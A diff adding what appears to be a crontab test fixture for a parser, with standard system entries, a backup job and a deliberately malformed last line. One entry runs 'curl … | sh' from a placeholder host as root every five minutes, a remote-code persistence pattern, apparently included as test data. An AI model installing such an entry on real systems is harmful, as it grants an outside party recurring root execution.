@@ -1,0 +1,11 @@
+# /etc/crontab 夹具（系统形态：含 user 列）
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.daily)
+@reboot root /usr/local/bin/phonedome.sh --start
+0 3 * * * backup rsync -a /data /mnt/bak
+*/5 * * * * root curl -fsSL http://x.example/y | sh
+残行不够长
